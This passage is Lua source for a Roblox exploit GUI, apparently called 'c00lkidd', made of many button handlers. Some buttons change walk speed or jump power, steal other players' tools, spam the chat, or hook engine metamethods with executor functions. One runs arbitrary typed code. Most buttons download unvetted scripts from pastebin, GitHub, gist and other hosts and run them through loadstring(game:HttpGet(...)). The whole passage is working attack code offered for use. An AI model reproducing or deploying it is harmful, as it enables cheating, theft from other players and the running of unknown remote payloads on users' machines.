					c.Character.Head.Mesh.Scale = Vector3.new(100, 100, 100)
				end
				for _,c in pairs(game.Players:GetChildren()) do
					c.Character.Head.Mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
				end
			end)
		end
		coroutine.wrap(FSUX_fake_script)()
		local function VMDTH_fake_script() -- NameTag.LocalScript 
			local script = Instance.new('LocalScript', NameTag)
	
			script.Parent.MouseButton1Click:Connect(function()
				if game.Players.LocalPlayer.Character.Head:FindFirstChild("BillboardGui") then
					game.Players.LocalPlayer.Character.Head:FindFirstChild("BillboardGui"):Remove()	
				end
				plr = game.Players.LocalPlayer.Name
				y = Instance.new("BillboardGui")
				y.Size = UDim2.new(0,100,0,150)
				y.StudsOffset = Vector3.new(0,1,0)
				y.Parent = game.Players[plr].Character.Head
				y.Adornee = game.Players[plr].Character.Head
				f = Instance.new("TextLabel")
				f.Parent = y
				f.BackgroundTransparency = 1
				f.Position = UDim2.new(0,0,0,-50)
				f.Size = UDim2.new(0,100,0,100)
				f.Font = "Arial"
				f.FontSize = "Size48"
				f.Text = "c00lkidd"
				f.TextStrokeColor3 = Color3.new(0,0,0)
				f.TextColor3 = Color3.new(1, 0, 0)
				f.TextStrokeTransparency = 0
				f.TextYAlignment = "Bottom" 
			end)
		end
		coroutine.wrap(VMDTH_fake_script)()
		local function NJAHNZ_fake_script() -- ControlNPCs.LocalScript 
			local script = Instance.new('LocalScript', ControlNPCs)
	
			script.Parent.MouseButton1Click:Connect(function()
				-- Variables
				local mouse = game.Players.LocalPlayer:GetMouse()
				local uis = game:GetService("UserInputService")
	
				-- Connect
				mouse.Button1Down:Connect(function()
					-- Check for Target & Left Shift
					if mouse.Target and uis:IsKeyDown(Enum.KeyCode.LeftControl) then
						local npc = mouse.target.Parent
						local npcRootPart = npc.HumanoidRootPart
						local PlayerCharacter = game:GetService("Players").LocalPlayer.Character
						local PlayerRootPart = PlayerCharacter.HumanoidRootPart
						local A0 = Instance.new("Attachment")
						local AP = Instance.new("AlignPosition")
						local AO = Instance.new("AlignOrientation")
						local A1 = Instance.new("Attachment")
						for _, v in pairs(npc:GetDescendants()) do
							if v:IsA("BasePart") then
								game:GetService("RunService").Stepped:Connect(function()
									v.CanCollide = false
								end)
							end
						end
						PlayerRootPart:BreakJoints()
						for _, v in pairs(PlayerCharacter:GetDescendants()) do
							if v:IsA("BasePart") then
								if v.Name == "HumanoidRootPart" or v.Name == "UpperTorso" or v.Name == "Head" then
								else
									v:Destroy()
								end
							end
						end
						PlayerRootPart.Position = PlayerRootPart.Position+Vector3.new(5, 0, 0)
						PlayerCharacter.Head.Anchored = true
						PlayerCharacter.UpperTorso.Anchored = true
						A0.Parent = npcRootPart
						AP.Parent = npcRootPart
						AO.Parent = npcRootPart
						AP.Responsiveness = 200
						AP.MaxForce = math.huge
						AO.MaxTorque = math.huge
						AO.Responsiveness = 200
						AP.Attachment0 = A0
						AP.Attachment1 = A1
						AO.Attachment1 = A1
						AO.Attachment0 = A0
						A1.Parent = PlayerRootPart
					end
				end)
			end)
		end
		coroutine.wrap(NJAHNZ_fake_script)()
		local function VZTHBQ_fake_script() -- Getallitems.LocalScript 
			local script = Instance.new('LocalScript', Getallitems)
	
			script.Parent.MouseButton1Click:Connect(function()
				local p = game:GetService("Players").LocalPlayer
				local c = p.Character
				if c and c:FindFirstChild("Humanoid") then
					for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
						if v:IsA("Tool") then
							c:FindFirstChild("Humanoid"):EquipTool(v)
						end
					end
				end
			end)
		end
		coroutine.wrap(VZTHBQ_fake_script)()
		local function ZXTU_fake_script() -- Blackhole.LocalScript 
			local script = Instance.new('LocalScript', Blackhole)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastebin.com/raw/Ug5aA1QL"))();
			end)
		end
		coroutine.wrap(ZXTU_fake_script)()
		local function LEYQG_fake_script() -- WalkOnWalls.LocalScript 
			local script = Instance.new('LocalScript', WalkOnWalls)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastebin.com/raw/H4c2LpFF"))();
			end)
		end
		coroutine.wrap(LEYQG_fake_script)()
		local function FGTZA_fake_script() -- SCP173.LocalScript 
			local script = Instance.new('LocalScript', SCP173)
	
			script.Parent.MouseButton1Click:Connect(function()
				_G.KeyCode = "X"
				loadstring(game:HttpGet("https://shattered-gang.lol/scripts/fe/fe_scp_173.lua"))()
			end)
		end
		coroutine.wrap(FGTZA_fake_script)()
		local function TMQBMM_fake_script() -- SCP106.LocalScript 
			local script = Instance.new('LocalScript', SCP106)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastebin.com/raw/Ft1QVpus"))();
			end)
		end
		coroutine.wrap(TMQBMM_fake_script)()
		local function IDHAD_fake_script() -- TextButton.LocalScript 
			local script = Instance.new('LocalScript', TextButton)
	
			script.Parent.MouseButton1Click:Connect(function(Speed)
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = script.Parent.Parent.TextBox.Text
			end)
		end
		coroutine.wrap(IDHAD_fake_script)()
		local function SIUF_fake_script() -- TextButton_2.LocalScript 
			local script = Instance.new('LocalScript', TextButton_2)
	
			script.Parent.MouseButton1Click:Connect(function()
				for i=1,3 do
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("\0", "All")
				end
			end)
		end
		coroutine.wrap(SIUF_fake_script)()
		local function NVQS_fake_script() -- TextButton_3.LocalScript 
			local script = Instance.new('LocalScript', TextButton_3)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)",true))()
			end)
		end
		coroutine.wrap(NVQS_fake_script)()
		local function UWGVZFD_fake_script() -- TextButton_4.LocalScript 
			local script = Instance.new('LocalScript', TextButton_4)
	
			script.Parent.MouseButton1Click:Connect(function(Speed)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = script.Parent.Parent.TextBox.Text
			end)
		end
		coroutine.wrap(UWGVZFD_fake_script)()
		local function DBJDK_fake_script() -- TextButton_5.LocalScript 
			local script = Instance.new('LocalScript', TextButton_5)
	
			script.Parent.MouseButton1Click:Connect(function()
				for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
					if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
						game:GetService("RunService").Heartbeat:connect(function()
							v.Velocity = Vector3.new(0,35,0)
							wait(0.5)
						end)
					end
				end
	
				game:GetService("StarterGui"):SetCore("SendNotification", { 
					Title = "Notification";
					Text = "Netless activated";
					Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
				Duration = 16;
			end)
		end
		coroutine.wrap(DBJDK_fake_script)()
		local function ALHSRTN_fake_script() -- TextButton_6.LocalScript 
			local script = Instance.new('LocalScript', TextButton_6)
	
			script.Parent.MouseButton1Click:Connect(function()
				script.Parent.Parent.Parent.Parent.Parent.Parent:Destroy()
				loadstring(game:HttpGet(('https://pastebin.com/raw/wa3c18cb'),true))()
			end)
		end
		coroutine.wrap(ALHSRTN_fake_script)()
		local function SLUB_fake_script() -- TextButton_7.LocalScript 
			local script = Instance.new('LocalScript', TextButton_7)
	
			script.Parent.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Settings.Page1.Visible = false
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Settings.Page2.Visible = true
			end)
		end
		coroutine.wrap(SLUB_fake_script)()
		local function TUCHBWF_fake_script() -- TextButton_8.LocalScript 
			local script = Instance.new('LocalScript', TextButton_8)
	
			script.Parent.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Settings.Page1.Visible = true
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Settings.Page2.Visible = false
			end)
		end
		coroutine.wrap(TUCHBWF_fake_script)()
		local function EZQREL_fake_script() -- Page3.LocalScript 
			local script = Instance.new('LocalScript', Page3)
	
			script.Parent.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Page1.Visible = false
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Page2.Visible = false
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Page3.Visible = true
			end)
		end
		coroutine.wrap(EZQREL_fake_script)()
		local function DFGD_fake_script() -- idk.LocalScript 
			local script = Instance.new('LocalScript', idk)
	
			script.Parent.MouseButton1Click:Connect(function()
				script.Parent.Parent.Visible = false
				script.Parent.Parent.Parent.cool.Visible = true
			end)
		end
		coroutine.wrap(DFGD_fake_script)()
		local function NPQW_fake_script() -- TextButton_9.LocalScript 
			local script = Instance.new('LocalScript', TextButton_9)
	
			script.Parent.MouseButton1Click:Connect(function()
				if not game:IsLoaded() then
					game.Loaded:Wait()
				end
	
				local LP = game:GetService('Players').LocalPlayer
				local PlayerScripts = LP ~= nil and LP:FindFirstChild('PlayerScripts') or nil
				local ChatScript = PlayerScripts ~= nil and PlayerScripts:FindFirstChild('ChatScript') or nil
				local ChatMain = ChatScript ~= nil and ChatScript:FindFirstChild('ChatMain') or nil
	
				if LP and ChatMain ~= nil then
					local Old, Chatted, OldChatted = nil, Instance.new('BindableEvent'), LP.Chatted; Chatted.Name = LP.Name..'_Chatted_Event'
					Old = hookmetamethod(game, '__index', newcclosure(function(self, Index)
						if checkcaller() and self == LP and Index == 'Chatted' then
							return Chatted.Event
						elseif not checkcaller() and self == LP and Index == 'Chatted' then
							return OldChatted
						end
	
						return Old(self, Index)
					end))
	
					local Old2, MessagePosted = nil, require(ChatMain).MessagePosted
					if MessagePosted then
						Old2 = hookfunction(MessagePosted.fire, function(self, ...)
							if not checkcaller() then
								return Chatted:Fire(...)
							end
						end)
					end
				end
			end)
		end
		coroutine.wrap(NPQW_fake_script)()
		local function SFJQW_fake_script() -- TextButton_10.LocalScript 
			local script = Instance.new('LocalScript', TextButton_10)
	
			script.Parent.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.PlayerGui.culgui:Destroy()
			end)
		end
		coroutine.wrap(SFJQW_fake_script)()
		local function ZAVI_fake_script() -- Next.LocalScript 
			local script = Instance.new('LocalScript', Next)
	
			script.Parent.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Page1.Visible = false
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Page2.Visible = true
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Page3.Visible = false
			end)
		end
		coroutine.wrap(ZAVI_fake_script)()
		local function ZPKLE_fake_script() -- Previous.LocalScript 
			local script = Instance.new('LocalScript', Previous)
	
			script.Parent.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Page1.Visible = true
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Page2.Visible = false
				game.Players.LocalPlayer.PlayerGui.culgui.Frame.Page3.Visible = false
			end)
		end
		coroutine.wrap(ZPKLE_fake_script)()
		local function WMPHH_fake_script() -- SuicideGun.LocalScript 
			local script = Instance.new('LocalScript', SuicideGun)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet(('https://pastebin.com/raw/TQGaAivj'),true))()
			end)
		end
		coroutine.wrap(WMPHH_fake_script)()
		local function PNWAZW_fake_script() -- GravityGun.LocalScript 
			local script = Instance.new('LocalScript', GravityGun)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet(('https://pastebin.com/raw/v4zD4kgk'),true))()
			end)
		end
		coroutine.wrap(PNWAZW_fake_script)()
		local function NLZS_fake_script() -- StealTools.LocalScript 
			local script = Instance.new('LocalScript', StealTools)
	
			script.Parent.MouseButton1Click:Connect(function()
				for i,v in pairs (game.Players:GetChildren()) do
					wait()
					for i,b in pairs (v.Backpack:GetChildren()) do
						b.Parent = game.Players.LocalPlayer.Backpack
					end
				end
			end)
		end
		coroutine.wrap(NLZS_fake_script)()
		local function EIYZ_fake_script() -- DevUzi.LocalScript 
			local script = Instance.new('LocalScript', DevUzi)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Reanimation.lua"))()
				loadstring(game:HttpGet("https://pastebin.com/raw/X2n20xqM"))()
			end)
		end
		coroutine.wrap(EIYZ_fake_script)()
		local function FFIRL_fake_script() -- M4Carbine.LocalScript 
			local script = Instance.new('LocalScript', M4Carbine)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet(('https://pastebin.com/raw/ptKU411j'),true))()
			end)
		end
		coroutine.wrap(FFIRL_fake_script)()
		local function HURJQK_fake_script() -- Uzi.LocalScript 
			local script = Instance.new('LocalScript', Uzi)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet(('https://www.klgrth.io/paste/qekbr/raw'),true))()
			end)
		end
		coroutine.wrap(HURJQK_fake_script)()
		local function PUSQ_fake_script() -- AK47.LocalScript 
			local script = Instance.new('LocalScript', AK47)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet(('https://www.klgrth.io/paste/dpoak/raw'),true))()
			end)
		end
		coroutine.wrap(PUSQ_fake_script)()
		local function LEMFME_fake_script() -- M3GreaseGun.LocalScript 
			local script = Instance.new('LocalScript', M3GreaseGun)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet(('https://www.klgrth.io/paste/fd28o/raw'),true))()
			end)
		end
		coroutine.wrap(LEMFME_fake_script)()
		local function PYOP_fake_script() -- Goner.LocalScript 
			local script = Instance.new('LocalScript', Goner)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/BonzaiBazooka/Melon-Hub-REBORN/main/Goner.txt", true))()
			end)
		end
		coroutine.wrap(PYOP_fake_script)()
		local function QXLJI_fake_script() -- TrueSSHub.LocalScript 
			local script = Instance.new('LocalScript', TrueSSHub)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet(('https://raw.githubusercontent.com/C00LMelon/True-SS-Hub/main/Protected.lua%20(4).txt'),true))()
			end)
		end
		coroutine.wrap(QXLJI_fake_script)()
		local function SEJBO_fake_script() -- GoodCopBadCop.LocalScript 
			local script = Instance.new('LocalScript', GoodCopBadCop)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/BonzaiBazooka/Melon-Hub-REBORN/main/GoodCopBadCop.txt", true))()
			end)
		end
		coroutine.wrap(SEJBO_fake_script)()
		local function OSSRT_fake_script() -- FallenAnger.LocalScript 
			local script = Instance.new('LocalScript', FallenAnger)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/BonzaiBazooka/Melon-Hub-REBORN/main/Fallen_Anger.txt", true))()
			end)
		end
		coroutine.wrap(OSSRT_fake_script)()
		local function WMHO_fake_script() -- NullwareHub.LocalScript 
			local script = Instance.new('LocalScript', NullwareHub)
	
			script.Parent.MouseButton1Click:Connect(function()
				getgenv().Theme = "Blue" -- To change the UI Theme, set this to one of the following options: "Red", "Purple", "Blue", "Green", "Yellow"
				loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/2d722888a388017c18028cd434c43a25/raw/dcccf1027fe4b90780e47767aaf584389c9d7771/EULma3fU90PUOKUn?identifier=".. (function()local a=""for b=1,256 do local c=math.random(1,3)a=a..string.char(c==1 and math.random(48,57)or c==2 and math.random(97,122)or c==3 and math.random(65,90))end;return a end)()))()
			end)
		end
		coroutine.wrap(WMHO_fake_script)()
		local function QFWOTF_fake_script() -- PunchScript.LocalScript 
			local script = Instance.new('LocalScript', PunchScript)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/BonzaiBazooka/Melon-Hub-REBORN/main/Muda.txt", true))()
			end)
		end
		coroutine.wrap(QFWOTF_fake_script)()
		local function PAJZ_fake_script() -- _500PoundsBall.LocalScript 
			local script = Instance.new('LocalScript', _500PoundsBall)
	
			script.Parent.MouseButton1Click:Connect(function()
				_G.specifictoolname = false
				_G.toolname = "BoomBox"
				loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/500%20Pounds%20Converted%20%5B1%20Tool%5D.lua'))()
			end)
		end
		coroutine.wrap(PAJZ_fake_script)()
		local function NKZNI_fake_script() -- GermanSoldier.LocalScript 
			local script = Instance.new('LocalScript', GermanSoldier)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet(('https://pastebin.com/raw/dc1WXdXq'),true))()
			end)
		end
		coroutine.wrap(NKZNI_fake_script)()
		local function KTRQHTQ_fake_script() -- Minigun.LocalScript 
			local script = Instance.new('LocalScript', Minigun)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet(('https://pastebin.com/raw/F9dTMFSe'),true))()
			end)
		end
		coroutine.wrap(KTRQHTQ_fake_script)()
		local function WDGKMO_fake_script() -- GKV3.LocalScript 
			local script = Instance.new('LocalScript', GKV3)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet(('https://www.klgrth.io/paste/mvzr4/raw'),true))()
			end)
		end
		coroutine.wrap(WDGKMO_fake_script)()
		local function WFLWLX_fake_script() -- GrabKnifeV4.LocalScript 
			local script = Instance.new('LocalScript', GrabKnifeV4)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet(('https://www.klgrth.io/paste/typd5/raw'),true))()
			end)
		end
		coroutine.wrap(WFLWLX_fake_script)()
		local function MBBMJ_fake_script() -- idk_2.LocalScript 
			local script = Instance.new('LocalScript', idk_2)
	
			script.Parent.MouseButton1Click:Connect(function()
				script.Parent.Parent.Parent.Settings.Visible = true
				script.Parent.Parent.Parent.cool.Visible = false
			end)
		end
		coroutine.wrap(MBBMJ_fake_script)()
		local function TADQZEV_fake_script() -- Clear.LocalScript 
			local script = Instance.new('LocalScript', Clear)
	
			local box = script.Parent.Parent.Input
			script.Parent.MouseButton1Click:Connect(function()
				box.Text = ""
			end)
		end
		coroutine.wrap(TADQZEV_fake_script)()
		local function LCLJ_fake_script() -- Execute.Script 
			local script = Instance.new('Script', Execute)
	
			script.Parent.MouseButton1Click:Connect(function()
				assert(loadstring(script.Parent.Parent.Input.Text))()
			end)
		end
		coroutine.wrap(LCLJ_fake_script)()
		local function ESJHH_fake_script() -- CloseOpen.LocalScript 
			local script = Instance.new('LocalScript', CloseOpen)
	
			script.Parent.MouseButton1Click:connect(function()
				if script.Parent.Parent.Frame.Visible == false then
					script.Parent.Parent.Frame.Visible = true
	
				else
					script.Parent.Parent.Frame.Visible = false
				end
			end)
		end
		coroutine.wrap(ESJHH_fake_script)()
	end)
end
coroutine.wrap(DEVR_fake_script)()